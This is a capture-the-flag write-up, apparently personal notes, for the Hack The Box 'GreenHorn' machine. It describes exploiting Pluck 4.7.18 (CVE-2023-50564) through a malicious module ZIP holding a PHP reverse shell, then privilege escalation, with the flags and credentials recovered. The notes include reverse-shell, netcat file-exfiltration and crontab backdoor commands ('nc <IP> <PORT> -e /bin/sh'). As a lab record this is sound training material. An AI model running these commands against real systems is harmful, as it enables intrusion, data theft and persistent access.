Port 80

![[Pasted image 20240918065427.png]]

![[Pasted image 20240918070211.png]]

![[Pasted image 20240918070330.png]]

pluck 4.7.18

`You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.`

Port 3000

![[Pasted image 20240918065949.png]]

I make a test user account and take a look at the file poasted by admin on the greenhorn github page

![[Pasted image 20240918071124.png]]

This tells me the amount of tries i have so maybe i can modify the request with an `X-Forwarded_For` header to spoof my ip. Doesn't seem to work.

![[Pasted image 20240918072151.png]]

![[Pasted image 20240918072907.png]]

`d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163`

![[Pasted image 20240918073200.png]]

![[Pasted image 20240918073418.png]]

iloveyou1

---

This logs me into pluck.

https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC

1. Clone this repository:
```php
git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC.git
cd CVE-2023-50564_Pluck-v4.7.18_PoC
```

2. Replace with the target domain name or IP address in the PoC script.
3. Create a `payload.zip` file containing `shell.php`. I recommand [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)PHP reverse shell and replace `<your_ip>` and `<port>` fields with your IP and listening port.
4. Run the PoC script:

```php
python exploit.py
```

5. You will be prompted to enter the path to the ZIP file:

```php
ZIP file path: ./path/to/payload.zip
```

Output example:

- If the login and upload are successful:
```php
Login account
ZIP file download.
<output of the executed shell.php>
```

- If a login error occurs:

```php
Login problem. response code: <code>
```

- If an upload error occurs:

```php
ZIP file download error. Response code: <code>
```

_Note_
Ensure that the `shell.php` file contains the correct reverse shell and your listener is waiting for the connection on the specified port.

---

Zip

```php
zip rev.zip revshell.php 
```

Install modules

Options -> manage modules -> install a module

![[Pasted image 20240918083531.png]]

Rev shell

```php
rlwrap nc -nlvp 8443
```

- _Port 8443 is an alternate port number that represents HTTPS or the Hypertext Transfer Protocol over a secure connection as given by SSL/TLS. That is to say, it is the alternative port number for the widely used default HTTPS port number 443 used in accessing web resources securely._

Pluck `4.7.18` can be exploited for its RCE vulnerability. We can upload/install a module for the CMS with a ZIP file, which contains malicious PHP script. Then we can access certain path to execute the PHP script.

First we create a ZIP file which has our reverse shell PHP script inside:

```php
zip openme.zip shell.php
```

Navigate to file to get a rev shell

```php
http://greenhorn.htb/data/modules/openme/shell.php
```

Stabilise shell

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```php
export TERM=xterm
```

- CTRL+Z

```php
stty raw -echo; fg
```


Users:
1. git
2. junior

User: junior
Pass: iloveyou1

/home/junior
flag1: b3b7f3e7ca451119b248a0cbf272a7eb

Start transfer server

```php
python3 -m http.server 80
```

```php
wget 10.10.14.14/<FILE>
```

Linpeas

`OS: Linux version 5.15.0-113-generic (buildd@lcy02-amd64-072) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024`

writable executable: /usr/local/bin/gitea

Internal Ports
- 22
- 53
- 80
- 3306

/etc/mysql/mariadb.cnf

```php
PermitRootLogin yes
UsePAM yes
    PasswordAuthentication no

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
```

/usr/share/openssh/sshd_config 

/tmp/tmux-1000

/home/junior/Using OpenVAS.pdf

transfer file to my machine for inspection with a pdf viewer

Me

```php
nc -lvp 4444 > FILE
```

```php
nc -lvp 4444 > 'Using OpenVAS.pdf'
```

Target
```php
nc <Target> 4444 -w 3 < FILE
```

```php
nc <ATTACKER_IP> 4444 -w 3 < 'Using OpenVAS.pdf'
```

![[Pasted image 20240919071607.png]]


They have provided a password inside the pdf, which is just a blurred image which we cannot see.

For a blurred image, we can try to **reverse the process of pixelation** to reveal the original text or content.

I can use a tool called **Depix**. It essentially uses a brute-force approach combined with intelligent matching algorithms to reverse the pixelation.

Extract the image from the pdf using PDF24 Tools.

https://github.com/spipm/Depix

Run depix on the extracted password png

```php
python3 depix.py \
    -p /home/kali/Documents/htb/greenhorn/0.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /home/kali/Documents/htb/greenhorn/output.png

```

![[Pasted image 20240919074358.png]]

![[Pasted image 20240919074437.png]]

User: root
Pass: sidefromsidetheothersidesidefromsidetheotherside

root flag:
68010f824ba1d50688172979275890e7

Extra:

Persistence via crontab:

```php
echo '* * * * * nc <IP> <PORT> -e /bin/sh' >> /etc/crontab
```

---

Exploit crafting details:

`POST /admin.php?action=installmodule`

`Content-Disposition: form-data; name="sendfile"; filename="payload.zip"`
`Content-Type: application/zip`

`Cookie: PHPSESSID=ns152q98g9afg7otftf1nn5rvk; i_like_gitea=b865f5a34bba6134; lang=en-US; _csrf=JMaz581fnUIxGHlpppXcArSmTMQ6MTcyNjY0MDM4Nzk3MDc5MDk2Mw`

`http://<url>/data/modules/payload/shell.php`